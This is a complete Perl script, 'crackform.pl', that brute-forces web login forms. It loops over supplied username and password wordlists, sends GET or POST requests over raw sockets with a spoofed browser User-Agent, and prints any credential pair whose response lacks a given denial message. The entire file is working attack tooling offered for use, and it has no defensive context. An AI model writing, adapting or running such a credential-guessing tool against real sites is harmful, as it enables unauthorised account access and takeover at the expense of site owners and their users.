#!/usr/bin/perl -w 
# crackform.pl - Uses user supplied userlist and password list to attempt to 
#			bruteforce a web form
#
# I'm a PERL amatuer, It's kinda just hacked together but I have tested it. 
# This was made because keist and I couldn't get medusa or hydra to work for us

use IO::Socket;
use Fcntl qw[ :seek ];	# our seek function

$argc = @ARGV;

# Make sure user supplied enough arguments
if ($argc!=8)
{
	print "crackform.pl by greg0 -- brute force a webform\n";
	print "Usage:\ncrackform.pl <username list> <password list> <username variable> <password variable> <method> <denial message> <server> <path>\n";
	die("Example:\ncrackform.pl users.lst passwords.lst GET \"access denied\" server.com /path/to/form.html\n");
}

# Transfer ARGV[X] to a variable so the code is more readable
open USERLIST, "<$ARGV[0]" or die("Could not open userlist\n");
open PASSLIST, "<$ARGV[1]" or die("Could not open passlist\n");
$uservar	= $ARGV[2];
$passvar	= $ARGV[3];
$method 	= $ARGV[4];
$denied 	= $ARGV[5];
$server		= $ARGV[6];
$path			= $ARGV[7];

# Cycle through usernames
while ($currentuser = <USERLIST>)
{
	# Remove newline
	chomp($currentuser);

	while ($currentpass = <PASSLIST>)
	{
		# Remove newline
		chomp($currentpass);

		# Connect to server
		$socket = new IO::Socket::INET(PeerAddr => $server,
                                 PeerPort => 80,
                                 Proto    => 'tcp') or
                                 die("Can't initialize socket\n");

		print "Trying $currentuser - $currentpass\n";
		
		# Get is easier, we just include variables in URL
		if ($method eq "GET" || $method eq "get")
		{
			print $socket "GET $path?$uservar=$currentuser&$passvar=$currentpass HTTP/1.1\n";
			print $socket "Host: localhost\n\n\n";
		}
		else # If not get, assume POST
		{
			print $socket "POST $path HTTP/1.1\n";
			print $socket "Host: $server\n";
			print $socket "User-Agent: Mozilla/4.0\n";	#That's right, we're pretending to be using mozilla 4.0
			print $socket "Content-Type: application/x-www-form-urlencoded\n";
			$contentlength = length "$uservar=$currentuser&$passvar=$currentpass";
			print $socket "Content-Length: $contentlength\n\n";
			print $socket "$uservar=$currentuser&$passvar=$currentpass\n\n";
		}
			
		$correct = 1;

		# Get resulting webpage
		while ($input = <$socket>)
		{
			if ($input =~ m/$denied/)
			{
				$correct = 0;
			}
		}
		
		# if we didn't find the denied string, we must have gotten it right!
		if ($correct)
		{
			close USERLIST;
			close PASSLIST;
			print "Cracked: Username = $currentuser; Password = $currentpass\n";
			exit(1);
		}

		# Close socket so we can try again
		close $socket;
	}

	# Go back to the beginning of the password list
	seek PASSLIST, 0, SEEK_SET or die("Cannont seek on passlist\n");
}

# If we made it this far, we didn't crack the form
print "Did not successfully crack web form.  Try a bigger password list\n";
